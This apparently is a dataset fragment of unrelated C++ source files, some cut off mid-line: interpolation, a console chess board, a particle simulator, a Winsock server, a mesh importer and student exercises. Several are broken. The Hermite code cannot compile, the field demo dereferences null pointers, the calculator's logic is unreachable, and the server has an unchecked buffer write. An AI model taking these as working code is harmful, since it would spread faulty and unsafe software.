    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <functional>\n\nstd::vector<double> Hermite(std::vector<double> x, std::vector<double> y, std::vector<double> der1, std::vector<double> der2, std::vector<int> der1_coord, std::vector<int> der2_coord) {\n    int n = x.size() + der1.size() + der2.size();\n    std::vector<double> a(n);\n    std::vector<double> H;\n    std::vector<double> derH;\n    std::vector<double> der2H;\n    double x0;\n    double h = a[0];\n    for (int i = 1; i < n; i++) {\n        h += a[i] * pow(x0, i);\n    }\n    std::function<double(double)> H = [&](double x0) { return h; };\n    std::function<double(double)> dH = [&](double x0) { return h.diff(x0); };\n    std::function<double(double)> d2H = [&](double x0) { return dH.diff(x0); };\n    std::vector<double> eq;\n    return eq;\n}\n\nint main() {\n    std::vector<double> x;\n    std::vector<double> y;\n    std::vector<double> der1;\n    std::vector<double> der2;\n    int N;\n    std::cin >> N;\n    for (int i = 0; i < N; i++) {\n        double x0;\n        std::cin >> x0;\n        x.push_back(x0);\n    }\n    for (int i = 0; i < N; i++) {\n        double y0;\n        std::cin >> y0;\n        y.push_back(y0);\n    }\n    std::vector<int> der1_coord;\n    std::vector<int> der2_coord;\n    int N1;\n    std::cin >> N1;\n    for (int i = 0; i < N1; i++) {\n        int point;\n        std::cin >> point;\n        double der;\n        std::cin >> der;\n        der1_coord.push_back(point - 1);\n        der1.push_back(der);\n    }\n    int N2;\n    std::cin >> N2;\n    for (int i = 0; i < N2; i++) {\n        int point;\n        std::cin >> point;\n        double der;\n        std::cin >> der;\n        der2_coord.push_back(point - 1);\n        der2.push_back(der);\n    }\n    std::vector<double> result = Hermite(x, y, der1, der2, der1_coord, der2_coord);\n    for (int i = 0; i < result.size(); i++) {\n        std::cout << result[i] << std::endl;\n    }\n    return 0;\n}",
    "#include <iostream>\n#include <ctime>\n\nusing namespace std;\n\nclass Item\n{\npublic:\n    virtual ~Item() {}  // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432\n    virtual void display() = 0;\n};\n\nclass Fish: public Item\n{\npublic:\n    Fish()\n    {\n        cout << \"Fish constructor called.\" << std::endl;\n    }\n\n    ~Fish()\n    {\n        cout << \"Fish destructor called.\" << std::endl;\n    }\n\n    void display() override {\n        cout << \"Fish\" << std::endl;\n    }\n\n};\n\nclass Boot: public Item\n{\npublic:\n    Boot()\n    {\n        cout << \"Boot constructor called.\" << std::endl;\n    }\n\n    ~Boot()\n    {\n        cout << \"Boot destructor called.\" << std::endl;\n    }\n\n    void display() override {\n        cout << \"Boot\" << std::endl;\n    }\n};\n\n\ntemplate<typename T>\nclass Field\n{\nprivate:\n    static const int SIZE = 9;\n    T *field[SIZE]; // \u041c\u0430\u0441\u0441\u0438\u0432 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0430 Fish, Boot\npublic:\n    Field()\n    {\n        // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0443\u043b\u0435\u0432\u044b\u043c\u0438 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f\u043c\u0438\n        for(int i = 0; i < SIZE; ++i)\n        {\n            field[i] = nullptr;\n        }\n    }\n\n    // \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0430\u043c\u044f\u0442\u0438 \u0438\u0437 \u043a\u0443\u0447\u0438\n    ~Field()\n    {\n        for(int i = 0; i < SIZE; ++i)\n        {\n            delete field[i]; // \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 Fish \u0438\u0437 \u043a\u0443\u0447\u0438\n        }\n    }\n\n    void addFish()\n    {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430\n        int randomIndex = std::rand() % SIZE;\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 Fish \u0432 \u043a\u0443\u0447\u0435 \u0438 \u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u0435\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 field\n        field[randomIndex] = new Fish();\n    }\n\n    void addBoot()\n    {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430\n        int randomIndex = std::rand() % SIZE;\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 Fish \u0432 \u043a\u0443\u0447\u0435 \u0438 \u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u0435\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 field\n        field[randomIndex] = new Boot();\n    }\n};\n\nvoid cast()\n{\n\n}\n\nint main()\n{\n    // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\n\n    Field<Item> field;\n    field.addFish(); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0440\u044b\u0431\u044b \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u043b\u0435\n    field.addBoot(); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0441\u0430\u043f\u043e\u0433\u0430 \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u043b\u0435\n\n    // \u0412\u044b\u0432\u043e\u0434 \u0442\u0438\u043f\u043e\u0432 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 \u0438\u0437 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438\n    //int size = sizeof(field) / sizeof(field[0]);\n    for (int i = 0; i < 9; ++i)\n    {\n        field[i]->display();\n    }\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"Board.h\"\n\nvoid Board::getRowColbyLeftClick(int& rpos, int& cpos)\n{\n\tHANDLE hInput = GetStdHandle(STD_INPUT_HANDLE);\n\tDWORD Events;\n\tINPUT_RECORD InputRecord;\n\tSetConsoleMode(hInput, ENABLE_PROCESSED_INPUT | ENABLE_MOUSE_INPUT | ENABLE_EXTENDED_FLAGS);\n\tdo\n\t{\n\t\tReadConsoleInput(hInput, &InputRecord, 1, &Events);\n\t\tif (InputRecord.Event.MouseEvent.dwButtonState == FROM_LEFT_1ST_BUTTON_PRESSED)\n\t\t{\n\t\t\tcpos = InputRecord.Event.MouseEvent.dwMousePosition.X;\n\t\t\trpos = InputRecord.Event.MouseEvent.dwMousePosition.Y;\n\t\t\tbreak;\n\t\t}\n\t} while (true);\n}\nvoid Board::gotoRowCol(int rpos, int cpos)\n{\n\tCOORD scrn;\n\tHANDLE hOuput = GetStdHandle(STD_OUTPUT_HANDLE);\n\tscrn.X = cpos;\n\tscrn.Y = rpos;\n\tSetConsoleCursorPosition(hOuput, scrn);\n}\nvoid Board::printPiece(int r , int c , char _sym)\n{\n\tswitch (_sym)\n\t{\n\tcase 'p':\n\tcase 'P':\n\t\tprintPawn(r, c);\n\t\tbreak;\n\tcase 'b':\n\tcase 'B':\n\t\tprintBishop(r, c);\n\t\tbreak;\n\tcase 'n':\n\tcase 'N':\n\t\tprintKnight(r, c);\n\t\tbreak;\n\tcase 'r':\n\tcase 'R':\n\t\tprintRook(r, c);\n\t\tbreak;\n\tcase 'k':\n\tcase 'K':\n\t\tprintKing(r, c);\n\t\tbreak;\n\tcase 'q':\n\tcase 'Q':\n\t\tprintQueen(r, c);\n\t\tbreak;\n\tcase HLSymbol:\n\t\tprintHighLightSymbol(r, c, _sym);\n\t\tbreak;\n\t}\n\t\n\n}\nvoid Board::printHighLightSymbol(int r, int c, char _sym)\n{\n\tgotoRowCol(r + (boxRows) / 2, c + (boxCols / 2));\n\tcout << _sym;\n}\n\nvoid Board::printPawn(int r, int c)\n{\n\tgotoRowCol(r + 1, c + 4);\n\tcout << space;\n\tgotoRowCol(r + 2, c + 3);\n\tcout << space<<space<<space;\n\tgotoRowCol(r + 3, c + 2);\n\tcout << space << space << space<<space<<space;\n\t\n}\t   //Print Shapes of Pieces\nvoid Board::printBishop(int r, int c)\n{\n\tgotoRowCol(r + 1, c + 2);\n\tcout << \"| \" <<char(209)<<\" |\";\n\tgotoRowCol(r + 2, c + 2);\n\tcout << space << space << space<<space<<space;\n\tgotoRowCol(r + 3, c + 3);\n\tcout << space << space << space;\n\n}\nvoid Board::printRook(int r, int c)\n{\n\tgotoRowCol(r + 1, c + 2);\n\tcout << space <<\" \"<< space<<\" \" << space;\n\tgotoRowCol(r + 2, c + 2);\n\tcout << space << space << space << space << space;\n\tgotoRowCol(r + 3, c + 3);\n\tcout << space << space << space;\n}\nvoid Board::printKnight(int r, int c)\n{\n\tgotoRowCol(r + 1, c + 1);\n\tcout << \"/\"<<space << space << space << space<<\"\\\\\";\n\tgotoRowCol(r + 2, c + 1);\n\tcout << space << \"   \" << space<<space;\n\tgotoRowCol(r + 3, c + 3);\n\tcout << space << space << space << space;\n\n\n}\n\nvoid Board::printKing(int r, int c)\n{\n\tgotoRowCol(r + 1, c + 2);\n\tcout << space << \" + \" << space;\n\tgotoRowCol(r + 2, c + 3);\n\tcout << space << space << space;\n\tgotoRowCol(r + 3, c + 2);\n\tcout << space << space << space << space << space;\n\n}\nvoid Board::printQueen(int r, int c)\n{\n\tgotoRowCol(r + 1, c + 2);\n\tcout << space << \" \" << space << \" \" << space;\n\tgotoRowCol(r + 2, c + 3);\n\tcout << space << space << space;\n\tgotoRowCol(r + 3, c + 2);\n\tcout << space << space << space << space << space;\n}\n\nbool Board::enemiesPiece(int turn,int ri,int ci)\n{\n\tchar sym = bs[ri][ci]->getSym();\n\tif (turn == 0 && sym >= 'a' && sym <= 'z')\n\t\treturn true;\n\telse if (turn == 1 && sym >= 'A' && sym <= 'Z')\n\t\treturn true;\n\treturn false;\n}\nvoid Board::init()\n{\n\t\n\tifstream rdr(\"data.txt\");\n\tchar sym;\n\tfor (int i = 0; i < rows; ++i)\n\t{\n\t\tfor (int j = 0; j < cols; ++j)\n\t\t{\n\t\t\trdr >> sym;\n\t\t\tswitch (sym)\n\t\t\t{ \n\t\t\tcase 'p':\n\t\t\t\tbs[i][j] = new Pawn(Black);\n\t\t\t\tbreak;\n\t\t\tcase 'P':\n\t\t\t\tbs[i][j] = new Pawn(White);\n\t\t\t\tbreak;\n\t\t\tcase 'b':\n\t\t\t\tbs[i][j] = new Bishop(Black);\n\t\t\t\tbreak; \n\t\t\tcase 'B':\n\t\t\t\tbs[i][j] = new Bishop(White );\n\n\t\t\t\t\tbreak;\n\t\t\tcase 'n':\n\t\t\t\tbs[i][j] = new Knight(Black );\n\n\t\t\t\tbreak;\n\t\t\tcase 'N':\n\t\t\t\tbs[i][j] = new Knight(White );\n\t\t\t\tbreak;\n\t\t\tcase 'r':\n\t\t\t\tbs[i][j] = new Rook(Black );\n\n\t\t\t\tbreak;\n\t\t\tcase 'R':\n\t\t\t\tbs[i][j] = new Rook(White );\n\n\t\t\t\tbreak;\n\t\t\tcase 'k':\n\t\t\t\tbs[i][j] = new King(Black );\n\n\t\t\t\tbreak;\n\t\t\tcase 'K':\n\t\t\t\tbs[i][j] = new King(White );\n\n\t\t\t\tbreak;\n\t\t\tcase 'q':\n\t\t\t\tbs[i][j] = new Queen(Black );\n\n\t\t\t\tbreak;\n\t\t\tcase 'Q':\n\t\t\t\tbs[i][j] = new Queen(White );\n\n\t\t\t\tbreak;\n\t\t\tcase '-':\n\t\t\t\tbs[i][j] = new Piece('-', White );\n\t\t\t}\n\n\t\t}\n\t}\n}\nvoid Board::printBox(int r , int c,char _sym)\n{\n\tif (_sym >= 'a' && _sym <= 'z')\n\t\tcout << black;\n\telse if (_sym != HLSymbol)\n\t\tcout << white;\n\telse\n\t\tcout << white <<blink;\n\tfor (int i = 0; i < boxRows; ++i)\n\t{\n\t\tgotoRowCol(r+i, c);\n\t\tfor (int j = 0; j < boxCols; ++j)\n\t\t\t\tcout << \" \";\n\n\t}\n\t\n\tprintPiece(r,c,_sym);\n\tgotoRowCol(39, 74); // Move the cursor away :D\n\tcout << reset;\n\n}\nvoid Board::printBoard()\n{\n\tbool val = false;\n\tfor (int i = 0; i < rows; ++i)\n\t{\n\t\tval = !val;\n\t\tfor (int j = 0; j < cols; ++j)\n\t\t{\n\t\t\tif (val)\n\t\t\t{\n\t\t\t\tcout << bglbrown;\n\t\t\t\tval = !val;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << bgdbrown;\n\t\t\t\tval = !val;\n\t\t\t}\n\t\t\tprintBox(i * boxRows, j * boxCols, bs[i][j]->getSym());\n\t\t}\n\t}\n\tcout << resetbg;\n\t\n\n}\nvoid Board::moveToPos(int sr, int sc, int dr, int dc,bool castle)\n{\n\tif (bs[sr][sc]->getIsFirst())\n\t\tbs[sr][sc]->setIsFirst(false);\t\t// First move has been made :)\n\n\tif (castle)\n\t{\n\t\tif (sc < dc)\t\t\t// Short Castle \n\t\t{\n\n\t\t\tdelete bs[sr][sc + 1];\n\t\t\tbs[sr][sc + 1] = bs[sr][sc+3];\n\n\t\t\tdelete bs[sr][sc + 2]",
    "#include <raylib.h>\r\n#include <iostream>\r\n#include \"particle.h\"\r\n#include <algorithm>\r\n\r\nvoid drawAllParticles(std::vector<VerletParticle*>& Group)\r\n{\r\n\tfor (VerletParticle* Particle : Group)\r\n\t{\r\n\t\tDrawCircle(Particle->getX() * 20.0f, Particle->getY() * 20.0f, Particle->getRadius() * 20.0f,\r\n\t\t\t\r\n\t\t\t//the colour values.\r\n\r\n\t\t\tColor{\r\n\t\t\t/* Red */  (unsigned char)(Particle->getY() * 5.0f) ,\r\n\t\t\t/* Green */(unsigned char)(Particle->getID() * 2.0f + 100.0f),\r\n\t\t\t/* Blue */ (unsigned char)(Particle->getX() * 3.0f),\r\n\t\t\t/* Alpha */(unsigned char)(Particle->getY() + (Particle->GetPosition() - Particle->GetOldPosition()).ToFloat() * 255.0f)});\r\n\t}\r\n}\r\nvoid updateAllPhyisics(std::vector<VerletParticle*>& Group, float& Time, Grid& TheGrid)\r\n{\r\n\tfor (VerletParticle* Particle : Group)\r\n\t{\r\n\t\tParticle->UpdatePosition(Time);\r\n\t\t//Particle->Print();\r\n\t}\r\n\r\n\tfor (VerletParticle* Particle : Group)\r\n\t{\r\n\t\tParticle->SolveGroundCollision();\r\n\t}\r\n\r\n\t//TheGrid.SolveCollisionWithGrid(Group);\r\n\t\r\n\tfor (size_t i = 0; i <\r\n\t\t//Group.size() / 150 + 1;\r\n\t\t1;\r\n\t\ti++)\r\n\t{\r\n\t\tfor (VerletParticle* Particle1 : Group)\r\n\t\t{\r\n\t\t\tfor (VerletParticle* Particle2 : Group)\r\n\t\t\t{\r\n\t\t\t\tif (Particle1->getID() != Particle2->getID())\r\n\t\t\t\t\tVerletParticle::SolveCollision(*Particle1, *Particle2);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\nvoid SpawnParticle(std::vector<VerletParticle*>& particles)\r\n{\r\n\tstatic int ParticleCount = 1;\r\n\tif (\r\n\t\t//GetFrameTime() < 1.0/10)\r\n\t\tParticleCount <= 500 )\r\n\t{\r\n\t\tVerletParticle* NewOne = new VerletParticle{ ParticleCount };\r\n\t\tParticleCount++;\r\n\t\tparticles.push_back(NewOne);\r\n\t//std::cout << ParticleCount << std::endl;\r\n\t}\r\n}\r\n\r\nint main()\r\n{\r\n\tint* ScreenWidth = new int{ GetScreenWidth() }, * ScreenHight = new int{ GetScreenHeight() };\r\n\r\n\tInitWindow(1600, 900,\r\n\t\t//*ScreenWidth, *ScreenHight,\r\n\t\t\"Physics Simulator\");\r\n\tSetTargetFPS(GetMonitorRefreshRate(GetCurrentMonitor()));\r\n\t//std::cout <<  << std::endl;\r\n\r\n\tstd::vector<VerletParticle*> Particles;\r\n\t//int ParticleCount = 0;\r\n\t \r\n\tGrid TheGrid;\r\n\t{\r\n\tint* hi1 = new int[5] { 1, 4, 5, 1, 2 };\r\n\tint* hi2 = new int[5] { 1, 2, 3, 4, 5 };\r\n\r\n\tint* hello = Helper::MergeSort::Merge(hi1, 5, hi2, 5);\r\n\r\n\tfor (size_t i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << hi1[i] << \" \";\r\n\t}\r\n\tstd::cout << std::endl;\r\n\tfor (size_t i = 0; i < 5; i++)\r\n\t{\r\n\t\tstd::cout << hi2[i] << \" \";\r\n\t}\r\n\tstd::cout << std::endl;\r\n\tfor (size_t i = 0; i < 10; i++)\r\n\t{\r\n\t\tstd::cout << hello[i] << \" \";\r\n\t}\r\n\tstd::cout << std::endl;\r\n}\r\n\t\r\n\twhile (!WindowShouldClose())\r\n\t{\r\n\t\t//std::cout << \"drawing started\" << std::endl;\r\n\t\tfloat DeltaTime = 0.01f;\r\n\r\n\t\tSpawnParticle(Particles);\r\n\t\tupdateAllPhyisics(Particles, DeltaTime, TheGrid);\r\n\t\t//DrawTheGrid(TheGrid);\r\n\r\n\t\t//Redering.\r\n\t\tBeginDrawing();\r\n\t\tClearBackground(Color{ 10,10,20 });\r\n\r\n\t\tdrawAllParticles(Particles);\r\n\t\tDrawFPS(10, 10);\r\n\r\n\t\tEndDrawing();\r\n\t\t//std::cout << \"drawing ended\" << std::endl;\r\n\t}\r\n\r\n\r\n\tCloseWindow();\r\n\treturn 0;\r\n}",
    "#include <iostream>\n#include <string>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include \"resource.h\"\n#include <tchar.h>\n#include <CommCtrl.h>\n#pragma comment(lib, \"Ws2_32.lib\")\n\nusing namespace std;\n\nHWND hwndEdit;\nWSADATA wsaData;\nSOCKET _socket;\n\nvoid StartServer() {\n    const int MAXSTRLEN = 255;\n    SOCKET acceptSocket;\n    sockaddr_in addr;\n\n    _socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    if (_socket == INVALID_SOCKET) {\n        MessageBox(NULL, \"Socket creation failed\", \"Error\", MB_OK | MB_ICONERROR);\n        return;\n    }\n\n    addr.sin_family = AF_INET;\n    inet_pton(AF_INET, \"0.0.0.0\", &addr.sin_addr);\n    addr.sin_port = htons(20000);\n\n    if (bind(_socket, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {\n        MessageBox(NULL, \"Bind failed\", \"Error\", MB_OK | MB_ICONERROR);\n        closesocket(_socket);\n        return;\n    }\n\n    if (listen(_socket, 1) == SOCKET_ERROR) {\n        MessageBox(NULL, \"Listen failed\", \"Error\", MB_OK | MB_ICONERROR);\n        closesocket(_socket);\n        return;\n    }\n\n    MessageBox(NULL, \"Server is started\", \"Success\", MB_OK | MB_ICONINFORMATION);\n\n    acceptSocket = accept(_socket, NULL, NULL);\n    if (acceptSocket == INVALID_SOCKET) {\n        MessageBox(NULL, \"Accept failed\", \"Error\", MB_OK | MB_ICONERROR);\n        closesocket(_socket);\n        return;\n    }\n\n    char buf[MAXSTRLEN];\n    int i = recv(acceptSocket, buf, MAXSTRLEN, 0);\n    buf[i] = '\\0';\n    MessageBox(NULL, buf, \"Message from Client\", MB_OK | MB_ICONINFORMATION);\n\n    const char* text = \"Hello from server!\";\n    send(acceptSocket, text, strlen(text), 0);\n\n    closesocket(acceptSocket);\n    closesocket(_socket);\n}\n\nBOOL CALLBACK DlgProc(HWND hwndDlg, UINT message, WPARAM wParam, LPARAM lParam) {\n    switch (message) {\n    case WM_INITDIALOG:\n        hwndEdit = GetDlgItem(hwndDlg, IDC_EDIT1);\n        break;\n    case WM_COMMAND:\n        switch (LOWORD(wParam)) {\n        case IDC_BUTTON1:\n            StartServer();\n            break;\n        }\n        break;\n    case WM_CLOSE:\n        EndDialog(hwndDlg, 0);\n        break;\n    default:\n        return FALSE;\n    }\n    return TRUE;\n}\n\nint WINAPI _tWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPTSTR lpszCmdLine, int nCmdShow) {\n    return DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG1), NULL, (DLGPROC)DlgProc);\n}\n",
    "#include \"Utils.hpp\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n#include <Eigen/Eigen>\n#include <cmath>\n\nnamespace PolygonalLibrary {\n\nbool ImportCell0Ds(const string &filename, PolygonalMesh& mesh)\n{\n    ifstream file;\n    file.open(filename);\n\n    if (file.fail())\n        return false;\n\n    list<string> listLines;\n    string line;\n    while (getline(file, line))\n    {\n        replace(line.begin(), line.end(), ';', ' ');\n        listLines.push_back(line);\n    }\n\n    listLines.pop_front();\n\n    mesh.NumberCell0D = listLines.size();\n    if (mesh.NumberCell0D == 0)\n    {\n        cerr << \"Non ci sono celle 0D\" << endl;\n        return false;\n    }\n\n    mesh.Cell0DId.reserve(mesh.NumberCell0D);\n    mesh.Cell0DCoordinates.reserve(mesh.NumberCell0D);\n\n    for (const string& line : listLines)\n    {\n        istringstream converter(line);\n        unsigned int id;\n        unsigned int marker;\n        Vector2d coord;\n\n        converter >> id >> marker >> coord(0) >> coord(1);\n\n        mesh.Cell0DId.push_back(id);\n        mesh.Cell0DCoordinates.push_back(coord);\n\n        if (marker != 0)\n        {\n            auto ret = mesh.Cell0DMarkers.insert({marker, {id}});\n            if (!ret.second)\n                (ret.first)->second.push_back(id);\n        }\n    }\n\n    file.close();\n    return true;\n}\n\n\n\nbool ImportCell1Ds(const string &filename, PolygonalMesh& mesh)\n{\n    ifstream file;\n    file.open(filename);\n\n    if (file.fail())\n        return false;\n\n    list<string> listLines;\n    string line;\n    while (getline(file, line))\n    {\n        replace(line.begin(), line.end(), ';', ' ');\n        listLines.push_back(line);\n    }\n\n    listLines.pop_front();\n\n    mesh.NumberCell1D = listLines.size();\n\n    if (mesh.NumberCell1D == 0)\n    {\n        cerr << \"Non ci sono celle 1D\" << endl;\n        return false;\n    }\n\n    mesh.Cell1DId.reserve(mesh.NumberCell1D);\n    mesh.Cell1DVertices.reserve(mesh.NumberCell1D);\n\n    for (const string& line : listLines)\n    {\n        istringstream converter(line);\n\n        unsigned int id;\n        unsigned int marker;\n        Vector2i vertices;\n\n        converter >> id >> marker >> vertices(0) >> vertices(1);\n\n        mesh.Cell1DId.push_back(id);\n        mesh.Cell1DVertices.push_back(vertices);\n\n        if (marker != 0)\n        {\n            auto ret = mesh.Cell1DMarkers.insert({marker, {id}});\n            if (!ret.second)\n                (ret.first)->second.push_back(id);\n        }\n    }\n\n    file.close();\n    return true;\n}\n\n\n\nbool ImportCell2Ds(const string &filename, PolygonalMesh& mesh)\n{\n    ifstream file;\n    file.open(filename);\n\n    if(file.fail())\n        return false;\n\n    list<string> listLines;\n    string line;\n    while (getline(file, line))\n    {\n        replace(line.begin(), line.end(), ';', ' ');\n        listLines.push_back(line);\n    }\n\n    listLines.pop_front();\n\n    mesh.NumberCell2D = listLines.size();\n\n    if (mesh.NumberCell2D == 0)\n    {\n        cerr << \"Non ci sono celle 2D\" << endl;\n        return false;\n    }\n\n    mesh.Cell2DId.reserve(mesh.NumberCell2D);\n    mesh.Cell2DVertices.reserve(mesh.NumberCell2D);\n    mesh.Cell2DEdges.reserve(mesh.NumberCell2D);\n\n    for (const string& line : listLines)\n    {\n        istringstream converter(line);\n\n        unsigned int id;\n        unsigned int marker;\n        converter >> id;\n        converter >> marker;\n\n        unsigned int NumVertices;\n        converter >> NumVertices;\n\n        vector<unsigned int> vertices(NumVertices);\n        for (unsigned int i = 0; i < NumVertices; i++)\n            converter >> vertices[i];\n\n        unsigned int NumEdges;\n        converter >> NumEdges;\n\n        vector<unsigned int> edges(NumEdges);\n        for (unsigned int i = 0; i < NumEdges; i++)\n            converter >> edges[i];\n\n        mesh.Cell2DId.push_back(id);\n        mesh.Cell2DVertices.push_back(vertices);\n        mesh.Cell2DEdges.push_back(edges);\n    }\n\n    file.close();\n    return true;\n}\n\n\nbool ImportMesh(const string &filepath, PolygonalMesh& mesh)\n{\n\n    if (!ImportCell0Ds(filepath + \"/Cell0Ds.csv\", mesh))\n    {\n        return false;\n    }\n    else\n    {\n        cout << \"Cell0D marker:\" << endl;\n        for (auto it = mesh.Cell0DMarkers.begin(); it != mesh.Cell0DMarkers.end(); it++)\n        {\n            cout << \"key:\\t\" << it->first << \"\\t values:\";\n            for (const unsigned int id : it->second)\n                cout << \"\\t\" << id;\n\n            cout << endl;\n        }\n    }\n\n\n    if (!ImportCell1Ds(filepath + \"/Cell1Ds.csv\", mesh))\n    {\n        return false;\n    }\n    else\n    {\n        cout << \"Cell1D marker:\" << endl;\n        for (auto it = mesh.Cell1DMarkers.begin(); it != mesh.Cell1DMarkers.end(); it++)\n        {\n            cout << \"key:\\t\" << it->first << \"\\t values:\";\n            for (const unsigned int id : it->second)\n                cout << \"\\t\" << id;\n\n            cout << endl;\n        }\n\n        // TEST LUNGHEZZA LATI\n        for (unsigned int c = 0; c < mesh.NumberCell1D; c++)\n   ",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    char choice;\r\n    double num1, num2;\r\n    do {\r\n        cout << \"Enter first number: \";\r\n        cin >> num1;\r\n\r\n        cout << \"Enter second number: \";\r\n        cin >> num2;\r\n\r\n        cout << \"Arithmetic Menu:\" << endl;\r\n        cout << \"1. Addition\" << endl;\r\n        cout << \"2. Subtraction\" << endl;\r\n        cout << \"3. Multiplication\" << endl;\r\n        cout << \"4. Division\" << endl;\r\n\r\n     }\r\n\r\n     while(choice == 'y'|| choice == 'Y');\r\n     cout<< \"Exit the program\"<< endl;\r\n\r\n    return 0;\r\n\r\n\r\n       switch(choice){\r\n         case 1:\r\n          cout<<\"Result:\" << \"num1 + num2\" <<endl;\r\n          break;\r\n\r\n           case 2:\r\n          cout<<\"Result:\" << \"num1 - num2\" <<endl;\r\n          break;\r\n\r\n           case 3:\r\n          cout<<\"Result:\" << \"num1 * num2\" <<endl;\r\n          break;\r\n\r\n           case 4:\r\n            if(num2 ==0){\r\n              cout<<\"Result:\" << \"The second integer is zero ,divide by zero.\"<<endl;\r\n        }\r\n        else{\r\n            cout<<\"Result:\"<< 